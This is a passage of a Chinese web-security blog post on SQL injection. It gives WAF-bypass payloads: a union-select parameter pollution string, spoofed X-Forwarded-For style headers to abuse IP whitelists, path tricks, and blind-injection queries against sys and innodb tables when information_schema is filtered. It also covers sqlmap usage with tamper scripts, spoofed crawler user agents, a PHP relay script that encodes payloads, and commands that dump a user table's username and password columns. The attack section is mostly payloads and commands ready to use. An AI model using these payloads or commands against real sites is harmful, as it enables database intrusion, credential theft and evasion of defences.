+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例：?id=1/**&amp;id=-1 union select 1,2,3#*/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ip白名单，改<code>X-forwarded-for</code>、<code>X-remote-IP</code>、<code>X-originating-IP</code>、<code>X-remote-addr</code>、<code>X-Real-IP</code></p>
+</li>
+<li><p>静态资源</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?id=1 and 1=1</span><br><span class="line">http://127.0.0.1/index.php/x.txt?id=1 and 1=1	依然正常运行</span><br><span class="line">http://127.0.0.1/index.php/admin.php?id=1 and 1=1	admin.php是在白名单里的没有拦截</span><br></pre></td></tr></table></figure>
+
+<ol start="19">
+<li><p>爬虫白名单</p>
+</li>
+<li><p>当过滤了<code>information_schema</code>时<br>可以用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code></p>
+<p>InnoDb引擎<br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了<code>innodb_index_stats</code>和<code>innodb_table_stats</code>两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p>
+<p>sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自<code>information_schema</code>和<code>performance_chema</code>，其本身不存储数据。可以通过其中的<code>schema_auto_increment_columns</code>来获取表名。</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))=103</span><br><span class="line"></span><br><span class="line">2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;.format()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>sqlmap、NoSQLAttack、Pangolin</p>
+<p>Sqlmap使用：</p>
+<p>一般：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot;</span><br></pre></td></tr></table></figure>
+
+<p>加上<strong>脚本</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --tamper=xxx.py</span><br></pre></td></tr></table></figure>
+
+<p>开<strong>代理</strong>（一般用于burp抓包分析）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<p>随机<strong>Agent</strong>头：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --random-agent</span><br></pre></td></tr></table></figure>
+
+<p>指定爬虫Agent(百度)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --user-agent=&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>加<strong>延迟</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;url&quot; --delay 1</span><br></pre></td></tr></table></figure>
+
+<p><strong>重写http头</strong>，可以借照post方式，直接以数据包形式扫。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 数据包文件 </span><br></pre></td></tr></table></figure>
+
+<p>参数值存在编码情况，<strong>中转注入</strong>，在本地写一个：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="variable">$urls</span>=<span class="variable">$url</span>.<span class="variable">$payload</span>;</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$urls</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$urls</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>sqlmap注入本地脚本地址—-》本地搭建脚本（请求数据自定义编写）访问远程地址</p>
+<hr>
+<p>获取当前<strong>数据库</strong></p>
+<p>sqlmap -u 网址 –forms –batch –current-db</p>
+<p>获取gkk库的<strong>表</strong></p>
+<p>sqlmap -u 网址 –forms –batch -D gkk –tables</p>
+<p>获取user的<strong>列</strong></p>
+<p>sqlmap -u 网址 –forms –batch -D gkk -T user –columns</p>
+<p>获取账号密码<strong>字段</strong></p>
+<p>sqlmap -u 网址 –forms –batch -D gkk -T user -C uname,pwd,vip –dump</p>
+<hr>
+<p><strong>参数</strong>：</p>
+<p>–banner：指纹信息</p>
+<p>–batch：使用非交互式扫描，SQLMap将不会询问</p>
+<p>–dbs：获取数据库列表</p>
+<p>–tables：获取所有的数据表</p>
+<p>–columns：获取所有字段(列)</p>
+<p>–dump：获取行数据</p>
+<p>-D：指定数据库</p>
+<p>-T：指定数据表</p>
+<p>-C：指定字段，用逗号间隔</p>
+<p>–user：当前用户</p>
+<p>–current-db：当前数据库</p>
+<p>–is-dba：是否为DBA(Database Administrator)</p>
+<p>–form 制作表格</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next" title="文件上传">
+      文件上传 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84"><span class="nav-number">1.</span> <span class="nav-text">数据库结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MYSQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">MYSQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F"><span class="nav-number">2.1.</span> <span class="nav-text">查询方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#select%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.1.</span> <span class="nav-text">select查询语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#insert%E6%8F%92%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.2.</span> <span class="nav-text">insert插入语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delete%E5%88%A0%E9%99%A4%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.1.3.</span> <span class="nav-text">delete删除语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#update%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE"><span class="nav-number">2.1.4.</span> <span class="nav-text">update更新数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.</span> <span class="nav-text">有回显注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.3.</span> <span class="nav-text">无回显盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.3.1.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.3.2.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.3.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#extractvalue"><span class="nav-number">2.3.3.1.</span> <span class="nav-text">extractvalue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml"><span class="nav-number">2.3.3.2.</span> <span class="nav-text">updatexml</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#floor"><span class="nav-number">2.3.3.3.</span> <span class="nav-text">floor</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dnslog%E6%B3%A8%E5%85%A5"><span class="nav-number">2.5.</span> <span class="nav-text">dnslog注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">2.6.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%87%BD%E6%95%B0%E5%8F%82%E8%80%83"><span class="nav-number">2.7.</span> <span class="nav-text">基本函数参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E4%BD%BF%E7%94%A8"><span class="nav-number">2.8.</span> <span class="nav-text">注释符使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5"><span class="nav-number">2.9.</span> <span class="nav-text">异或注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="nav-number">2.10.</span> <span class="nav-text">WAF绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">3.</span> <span class="nav-text">工具</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Ja1e</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ja1e" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ja1e" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ja1e428@163.com" title="E-Mail → mailto:ja1e428@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ja1e</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
